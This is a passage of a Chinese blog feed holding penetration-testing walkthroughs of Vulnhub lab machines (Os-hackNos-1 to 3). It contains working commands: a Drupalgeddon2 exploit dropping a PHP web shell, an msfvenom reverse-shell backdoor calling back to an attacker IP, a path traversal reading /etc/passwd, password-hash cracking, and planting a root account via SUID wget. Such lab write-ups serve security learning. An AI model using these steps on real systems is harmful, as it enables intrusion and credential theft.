/>与meterpreter类似，但是只是上传一个流量转发工具而不是后门程序，所以可能不太会需要考虑到免杀这一方面，但是开启代理服务的话貌似还是有点危险的。而且如果进行多层渗透的话，可能需要相应的多搭几条代理路线，在操作时可能需要记下相应的信息。</p><p>nmap进行扫描最好带上<code>-n</code>来取消掉dns解析</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_Walkthrough_Set</title>
    <link href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/"/>
    <id>https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/</id>
    <published>2023-02-08T00:05:32.000Z</published>
    <updated>2023-03-02T16:44:13.987Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="os-hacknos-1"><a class="markdownIt-Anchor" href="#os-hacknos-1"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">Os-hackNos-1</a></h1><p><code>2019/11/30 22:06:46</code></p><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h2><p><code>dirb http://192.168.56.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279)                                                  </span><br><span class="line">                                                                                                           </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687)                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F;                                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt (CODE:200|SIZE:2189)                                             </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F;                                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200)                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>Web服务采用了Drupal框架</p><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对目标使用Exploit<br /><code>ruby drupalgeddon2.rb http://192.168.56.104/drupal/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Testing: Writing To Web Root   (.&#x2F;)</span><br><span class="line">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php</span><br><span class="line">[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;</span><br><span class="line">[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">[i] Fake PHP shell:   curl &#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;</span><br><span class="line">hackNos&gt;&gt; id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>成功获取WebShell</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查看服务器系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>使用weevely编写WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass wee.php</span><br><span class="line">mv wee.php wee</span><br></pre></td></tr></table></figure><p>在服务器上用wget下载WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.102&#x2F;wee</span><br><span class="line">mv wee wee.php</span><br></pre></td></tr></table></figure><p>连接WebShell<br /><code>weevely http://192.168.56.104/drupal/wee.php pass</code></p><p>使用MSFVenom编写后门<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf</code></p><p>在服务器上用WebShell上传后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elf</span><br><span class="line">ls -l msf.elf</span><br><span class="line">    -rw-r--r--  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">chmod 755 msf.elf</span><br><span class="line">    -rwxr-xr-x  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">hackNos: .&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.56.102</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    ad3sa&#x2F;MFODb7k</span><br><span class="line">echo &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">happy_hacker</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p><strong>另一个思路</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">snap --version</span><br><span class="line"></span><br><span class="line">snap    2.34.2ubuntu0.1  </span><br><span class="line">snapd   2.34.2ubuntu0.1  </span><br><span class="line">series  16               </span><br><span class="line">ubuntu  16.04            </span><br><span class="line">kernel  4.4.0-142-generic</span><br></pre></td></tr></table></figure><p>CVE-2019-7304一把梭</p><hr /><p>补充一些细节<br />由于Kali在VMware下而Ubuntu在VBox，导致网络有些问题<br />Kali可以连通Ubuntu但是反之不行<br />即Kali可以用EXP获取Shell但Ubuntu不能反弹Shell给Kali<br />所以需要Windows用MSF接收反弹Shell</p><p>在EXP的Shell中，wget获取的文件权限为644且所有者为root，即不能直接wget一个Meterpreter后门程序并执行<br />但可以用wget获取weevely的WebShell，644的权限且所有者为root并不会影响WebShell的连接，而且在WebShell中，可以进行文件上传和下载，wget所得的文件权限为644，所有者为www-data，即可以用WebShell获取Meterpreter后门程序</p><p>在wget一个WebShell之前，要修改文件后缀名<br />服务器会把php后缀的文件解析并执行，就不能获取该php文件<br />而修改文件后缀名之后服务器则无法解析，从而获取WebShell<br />在获取之后修改文件后缀名为.php，并移动到Web目录下<br />即可连接WebShell</p><p>切换用户需要一个标准Shell<br />可以在Meterpreter中获取</p><hr /><h1 id="os-hacknos-2"><a class="markdownIt-Anchor" href="#os-hacknos-2"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">Os-hackNos-2</a></h1><p><code>2020/01/10 23:58:25</code></p><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.1.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h2><p><code>dirb http://192.168.1.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>Web服务采用了Wordpress框架</p><p>使用wpscan针对wordpress进行扫描</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate p</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line"></span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh flag@192.168.1.104</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可(但是更推荐用下面的方法获取TTY)</p><p>或者使用python获取一个支持完全交互的TTY(如果目标机器上只有python3而没有python2，则改为python3执行即可)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息</p><p>发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash </span><br><span class="line"></span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line"></span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>总体来看渗透难度并不高，但是这里我想稍微记录一些关于wpscan的内容<br />wpscan是一个基于ruby，针对wordpress框架的web扫描器<br />但是之前kali上一直运行不了wpscan，一直以为是wpscan软件的问题，多次失败之后才发现是ruby的问题<br />官网有这么一句话<br /><strong>(Optional but highly recommended: RVM)</strong><br />现在看来也觉得确实如此<br />所以一番折腾之后终于在非root用户上安装好了rvm，然后换ruby源，安装ruby2.5.5，换gem源，再用gem安装一遍wpscan<br />最后终归是能正常使用wpscan了</p><p>参考资料</p><blockquote><p><a href="https://rvm.io/rvm/install">rvm</a><br /><a href="https://ruby-china.org/wiki/rvm-guide">rvm</a><br /><a href="https://blog.51cto.com/autopython/1839229">wpscan</a><br /><a href="https://www.freebuf.com/sectool/174663.html">rvm</a><br /><a href="https://www.cnblogs.com/kuaile1314/p/12132730.html">wp</a></p></blockquote><hr /><h1 id="os-hacknos-3"><a class="markdownIt-Anchor" href="#os-hacknos-3"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">Os-hackNos-3</a></h1><p><code>2020/01/19 21:46:32</code></p><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.39</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)</span><br><span class="line">|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)</span><br><span class="line">|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: WebSec</span><br><span class="line">MAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)</span><br><span 